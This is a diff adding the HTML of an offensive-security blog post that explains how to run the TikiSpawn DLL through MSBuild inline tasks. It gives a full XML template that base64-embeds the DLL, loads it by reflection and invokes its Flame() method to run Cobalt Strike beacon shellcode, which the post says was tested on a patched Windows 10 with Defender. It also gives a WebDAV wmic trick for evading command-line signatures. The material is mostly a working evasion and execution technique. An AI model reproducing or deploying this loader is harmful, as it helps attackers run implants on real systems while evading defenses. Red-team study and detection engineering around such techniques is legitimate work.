@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">TikiSpawn &amp; MSBuild</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#xml">XML</a></li>
+        <li><a href="#closing">Closing</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <p>The main impetus behind this post was me experimenting with ways to leverage TikiSpawn with some of the popular <a href="https://lolbas-project.github.io">lolbins</a>.</p>
+<p>TikiSpawn was of course designed as a DLL that could be converted to JScript, VBScript and VBA using <a href="https://twitter.com/tiraniddo">James Forshaw&rsquo;s</a> <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>, which could in turn be executed using <code>regsvr32</code>, <code>wmic</code>, <code>mshta</code> and others.  However, we&rsquo;ve seen Microsoft push back with two main tactics.</p>
+<ul>
+<li>
+<p>The first is by using commandline signatures for expected patterns such as <code>wmic os get /format:http://blah</code>.  In some instances, these are relatively simple to work around, for example by using WebDAV: <code>wmic os get /format:\\blah</code>.</p>
+</li>
+<li>
+<p>The second is by hooking AMSI into the Windows Script Host and killing off functions such as <code>DynamicInvoke</code>, that are synonymous with DotNetToJScript payloads.  This seems completely indiscriminate - blocking all serialized objects regardless of what they contain.</p>
+</li>
+</ul>
+<p>MSBuild has been known as a lolbin for some time, as it can execute arbitrary inline C# from an <code>xml</code> or <code>csproj</code> file.  The challenge with <a href="https://github.com/rasta-mouse/TikiTorch">TikiTorch</a> is that projects like <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/TikiSpawn/Program.cs#L5">TikiSpawn</a> leverage the <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/TikiLoader/Loader.cs">TikiLoader</a>, which is it&rsquo;s own independant project, and also quite large.  So instead of copy/pasting massive chunks of C# into an XML file, one simple method is to compile the TikiSpawn DLL, base64 encode it, and use MSBuild to load it via reflection.</p>
+<h3 id="xml">XML</h3>
+<p>This is the XML template I used, adapted from <a href="https://github.com/3gstudent/msbuild-inline-task">3gstudent</a>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;Project</span> <span class="na">ToolsVersion=</span><span class="s">&#34;4.0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/developer/msbuild/2003&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Target</span> <span class="na">Name=</span><span class="s">&#34;TikiTorch&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;TikiSpawn</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/Target&gt;</span>
+  <span class="nt">&lt;UsingTask</span>
+    <span class="na">TaskName=</span><span class="s">&#34;TikiSpawn&#34;</span>
+    <span class="na">TaskFactory=</span><span class="s">&#34;CodeTaskFactory&#34;</span>
+    <span class="na">AssemblyFile=</span><span class="s">&#34;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&#34;</span> <span class="nt">&gt;</span>
+    <span class="nt">&lt;Task&gt;</span>
+    
+      <span class="nt">&lt;Code</span> <span class="na">Type=</span><span class="s">&#34;Class&#34;</span> <span class="na">Language=</span><span class="s">&#34;cs&#34;</span><span class="nt">&gt;</span>
+      <span class="cp">&lt;![CDATA[
+</span><span class="cp">
+</span><span class="cp">          using System;
+</span><span class="cp">          using System.Reflection;
+</span><span class="cp">          using System.Runtime.InteropServices;
+</span><span class="cp">          using Microsoft.Build.Framework;
+</span><span class="cp">          using Microsoft.Build.Utilities;
+</span><span class="cp">
+</span><span class="cp">          public class TikiSpawn : Task, ITask
+</span><span class="cp">          {    
+</span><span class="cp">            public override bool Execute()
+</span><span class="cp">            {
+</span><span class="cp">              Console.WriteLine(&#34;Hello World!&#34;);
+</span><span class="cp">              return true;
+</span><span class="cp">            }
+</span><span class="cp">          }
+</span><span class="cp">
+</span><span class="cp">      ]]&gt;</span>
+      <span class="nt">&lt;/Code&gt;</span>
+    <span class="nt">&lt;/Task&gt;</span>
+  <span class="nt">&lt;/UsingTask&gt;</span>
+<span class="nt">&lt;/Project&gt;</span>
+</code></pre></div><p>Running MSBuild provides the expected output.</p>
+<figure>
+    <img src="/images/msbuild/template.png"/> 
+</figure>
+
+<p>The main modification to the TikiSpawn source code is to make the <code>Flame()</code> function a <code>public static</code>.</p>
+<figure>
+    <img src="/images/msbuild/tikispawn.png"/> 
+</figure>
+
+<p>For <code>shellcode.txt</code>, I use Cobalt Strike&rsquo;s stageless raw payload and run it through <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/Get-CompressedShellcode.ps1">Get-CompressedShellcode.ps1</a>.</p>
+<figure>
+    <img src="/images/msbuild/getcompressedshellcode.png"/> 
+</figure>
+
+<p>Now base64 encode the TikiSpawn DLL and put it into the XML template along with the reflection code.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c#" data-lang="c#"><span class="n">PS</span> <span class="n">C</span><span class="p">:</span><span class="err">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s">&#34;C:\Tools\TikiTorch\TikiSpawn\bin\Debug\TikiSpawn.dll&#34;</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;Project</span> <span class="na">ToolsVersion=</span><span class="s">&#34;4.0&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/developer/msbuild/2003&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Target</span> <span class="na">Name=</span><span class="s">&#34;TikiTorch&#34;</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;TikiSpawn</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/Target&gt;</span>
+  <span class="nt">&lt;UsingTask</span>
+    <span class="na">TaskName=</span><span class="s">&#34;TikiSpawn&#34;</span>
+    <span class="na">TaskFactory=</span><span class="s">&#34;CodeTaskFactory&#34;</span>
+    <span class="na">AssemblyFile=</span><span class="s">&#34;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&#34;</span> <span class="nt">&gt;</span>
+    <span class="nt">&lt;Task&gt;</span>
+    
+      <span class="nt">&lt;Code</span> <span class="na">Type=</span><span class="s">&#34;Class&#34;</span> <span class="na">Language=</span><span class="s">&#34;cs&#34;</span><span class="nt">&gt;</span>
+      <span class="cp">&lt;![CDATA[
+</span><span class="cp">
+</span><span class="cp">          using System;
+</span><span class="cp">          using System.Reflection;
+</span><span class="cp">          using System.Runtime.InteropServices;
+</span><span class="cp">          using Microsoft.Build.Framework;
+</span><span class="cp">          using Microsoft.Build.Utilities;
+</span><span class="cp">
+</span><span class="cp">          public class TikiSpawn : Task, ITask
+</span><span class="cp">          {
+</span><span class="cp">            public const string Dll = &#34;TVqQ[...snip...]AAA=&#34;;
+</span><span class="cp">
+</span><span class="cp">            public override bool Execute()
+</span><span class="cp">            {
+</span><span class="cp">              Assembly TikiSpawn = Assembly.Load(Convert.FromBase64String(Dll));
+</span><span class="cp">
+</span><span class="cp">              Type type = TikiSpawn.GetType(&#34;TikiSpawn&#34;);
+</span><span class="cp">              object instance = Activator.CreateInstance(type);
+</span><span class="cp">
+</span><span class="cp">              type.InvokeMember(&#34;Flame&#34;,
+</span><span class="cp">                BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public,
+</span><span class="cp">                null,
+</span><span class="cp">                instance,
+</span><span class="cp">                new object[] { });
+</span><span class="cp">
+</span><span class="cp">              return true;
+</span><span class="cp">            }
+</span><span class="cp">          }
+</span><span class="cp">
+</span><span class="cp">      ]]&gt;</span>
+      <span class="nt">&lt;/Code&gt;</span>
+    <span class="nt">&lt;/Task&gt;</span>
+  <span class="nt">&lt;/UsingTask&gt;</span>
+<span class="nt">&lt;/Project&gt;</span>
+</code></pre></div><p><figure>
+    <img src="/images/msbuild/tikixml.png"/> 
+</figure>
+
+<figure>
+    <img src="/images/msbuild/beacon.png"/> 
+</figure>
+</p>
+<h3 id="closing">Closing</h3>
+<p>This was tested on a fully patched Windows 10 1903 build with Defender.  There&rsquo;s nothing new here, just fun to do it using TikiSpawn.</p>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/collector-service/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/tikivader/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
